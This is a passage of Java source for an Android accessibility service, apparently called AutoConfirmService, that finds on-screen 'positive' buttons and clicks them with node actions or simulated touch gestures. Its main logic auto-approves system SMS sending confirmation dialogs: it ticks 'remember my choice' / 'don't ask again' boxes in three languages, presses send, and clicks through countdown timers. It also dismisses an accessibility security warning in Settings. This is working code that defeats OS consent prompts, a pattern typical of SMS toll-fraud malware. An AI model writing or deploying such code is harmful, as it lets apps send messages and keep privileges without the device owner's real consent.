                String tStr = text != null ? text.toString().toLowerCase(Locale.ROOT).trim() : "";
                String dStr = desc != null ? desc.toString().toLowerCase(Locale.ROOT).trim() : "";
                String full = (tStr + " " + dStr).trim();

                for (String pos : POSITIVE_BUTTON_TEXTS) {
                    String pLower = pos.toLowerCase(Locale.ROOT).trim();
                    if (full.equals(pLower) || tStr.equals(pLower) || dStr.equals(pLower) ||
                        (full.contains(pLower) && !containsNegativeWord(full))) {
                        return AccessibilityNodeInfo.obtain(node);
                    }
                }
            }

            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    AccessibilityNodeInfo res = scanTreeForPositiveButton(child);
                    safeRecycle(child);
                    if (res != null) return res;
                }
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private boolean containsNegativeWord(String text) {
        if (text == null || text.isEmpty()) return false;
        String lower = text.toLowerCase(Locale.ROOT);
        for (String neg : DANGEROUS_NEGATIVE_WORDS) {
            if (lower.contains(neg)) return true;
        }
        return false;
    }

    /**
     * Multi-tier Click Engine:
     * 1. Direct ACTION_CLICK
     * 2. Parent ACTION_CLICK
     * 3. Hardware Finger Tap Gesture (dispatchGesture)
     */
    private boolean performSmartClick(AccessibilityNodeInfo node) {
        if (node == null || isDangerousNode(node)) return false;

        boolean clicked = false;

        // 1. Direct Click
        try {
            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.i(TAG, "Direct ACTION_CLICK succeeded on positive node.");
                clicked = true;
            }
        } catch (Throwable ignored) {}

        // 2. Parent Click
        if (!clicked && clickNodeOrParent(node)) {
            Log.i(TAG, "Parent ACTION_CLICK succeeded.");
            clicked = true;
        }

        // 3. Fallback: Physical Touch Gesture Tap at Screen Coordinates
        try {
            if (dispatchTapGesture(node)) {
                Log.i(TAG, "Physical touch tap gesture dispatched successfully.");
                clicked = true;
            }
        } catch (Throwable ignored) {}

        return clicked;
    }

    /**
     * Dispatches a direct touch tap at the center coordinates of the node on screen.
     */
    public boolean dispatchTapGesture(AccessibilityNodeInfo node) {
        if (node == null || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        try {
            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            if (bounds.width() <= 0 || bounds.height() <= 0) return false;

            final float x = bounds.centerX();
            final float y = bounds.centerY();

            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 50);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(stroke);

            return dispatchGesture(builder.build(), new GestureResultCallback() {
                @Override
                public void onCompleted(GestureDescription gestureDescription) {
                    Log.i(TAG, "🎯 Gesture tap completed at (" + x + ", " + y + ")");
                }
                @Override
                public void onCancelled(GestureDescription gestureDescription) {
                    Log.w(TAG, "⚠️ Gesture tap cancelled at (" + x + ", " + y + ")");
                }
            }, null);
        } catch (Throwable t) {
            Log.w(TAG, "dispatchTapGesture error: " + t.getMessage());
            return false;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        AccessibilityNodeInfo rootNode = null;
        try {
            CharSequence pkgName = event.getPackageName();
            String pkgStr = pkgName != null ? pkgName.toString().toLowerCase(Locale.ROOT) : "";

            // 🛑 ABSOLUTE SHIELD 1: NEVER TOUCH ANY USER/COMMUNICATION/SOCIAL/BANKING APPS!
            if (USER_APPS_BLACKLIST.contains(pkgStr)) {
                return;
            }
            for (String blacklisted : USER_APPS_BLACKLIST) {
                if (pkgStr.startsWith(blacklisted)) {
                    return;
                }
            }

            // 🛑 ABSOLUTE SHIELD 2: Skip all keyboard, IME, and input methods
            if (pkgStr.contains("inputmethod") || pkgStr.contains("keyboard") || 
                pkgStr.contains("ime") || pkgStr.contains("baidu") || pkgStr.contains("touchtype")) {
                return;
            }

            // 🛑 ABSOLUTE SHIELD 3: Settings App Protection
            // In Android Settings, ONLY handle the ColorOS 4-second warning ("استمرار التشغيل").
            // Never touch accessibility lists, TikTok Studio items, or toggle switches!
            if (pkgStr.contains("settings")) {
                rootNode = findBestRootNode(event);
                if (rootNode != null && isAccessibilitySecurityDialog(rootNode)) {
                    handleAccessibilitySecurityDialog(rootNode);
                }
                return;
            }

            // Active check for SMS confirmation dialog across all windows
            AccessibilityNodeInfo smsRoot = findSmsDialogCandidate(event);
            if (smsRoot != null && checkIsSmsDialog(smsRoot)) {
                long now = SystemClock.uptimeMillis();
                lastActionTimestamp.set(now);

                // Step 1: Automatically check "Remember my choice"
                autoCheckRememberChoice(smsRoot);

                // Step 2: Attempt immediate click on positive send button
                AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(smsRoot);
                if (positiveBtn != null) {
                    try {
                        if (!isDangerousNode(positiveBtn)) {
                            performSmartClick(positiveBtn);
                        }
                    } finally {
                        safeRecycle(positiveBtn);
                    }
                }
                safeRecycle(smsRoot);

                // Step 3: Ensure SMS watcher is running to click through countdown timer
                startSmsConfirmWatcher();
                return;
            }
            safeRecycle(smsRoot);

        } catch (Throwable e) {
            Log.w(TAG, "Safe catch in onAccessibilityEvent: " + e.getMessage());
        } finally {
            safeRecycle(rootNode);
        }
    }

    /**
     * Check any unchecked checkbox in the dialog (e.g. "Do not ask again" / "تذكر خياري" / "Ne plus me demander")
     */
    private void autoCheckRememberChoice(AccessibilityNodeInfo root) {
        if (root == null) return;

        // Try known View IDs first
        for (String cid : CHECKBOX_VIEW_IDS) {
            List<AccessibilityNodeInfo> checkboxes = null;
            try {
                checkboxes = root.findAccessibilityNodeInfosByViewId(cid);
                if (checkboxes != null) {
                    for (AccessibilityNodeInfo cb : checkboxes) {
                        if (cb.isCheckable() && !cb.isChecked()) {
                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via View ID: " + cid);
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(checkboxes);
            }
        }

        // Try matching common checkbox text in Arabic, French, English
        String[] rememberTexts = new String[] {
            "تذكر خياري",
            "عدم السؤال مرة أخرى",
            "تذكر اختياري",
            "تذكر هذا الاختيار",
            "تذكر دائماً",
            "لا تسأل مرة أخرى",
            "ne plus me demander",
            "se souvenir de mon choix",
            "mémoriser mon choix",
            "remember my choice",
            "don't ask again",
            "do not ask again"
        };
        for (String rText : rememberTexts) {
            List<AccessibilityNodeInfo> nodes = null;
            try {
                nodes = root.findAccessibilityNodeInfosByText(rText);
                if (nodes != null) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isCheckable() && !node.isChecked()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via text: " + rText);
                        } else {
                            AccessibilityNodeInfo parent = node.getParent();
                            if (parent != null) {
                                for (int i = 0; i < parent.getChildCount(); i++) {
                                    AccessibilityNodeInfo child = parent.getChild(i);
                                    if (child != null) {
                                        if (child.isCheckable() && !child.isChecked()) {
                                            child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                            Log.i(TAG, "Checked 'Remember my choice' sibling checkbox for: " + rText);
                                        }
                                        safeRecycle(child);
                                    }
                                }
                                safeRecycle(parent);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(nodes);
            }
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            if (node.isClickable() && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true;
            }
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null) {
                try {
                    if (parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        return true;
                    }
                    AccessibilityNodeInfo grandParent = parent.getParent();
                    if (grandParent != null) {
                        try {
                            if (grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                return true;
                            }
                        } finally {
                            safeRecycle(grandParent);
                        }
                    }
                } finally {
                    safeRecycle(parent);
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}

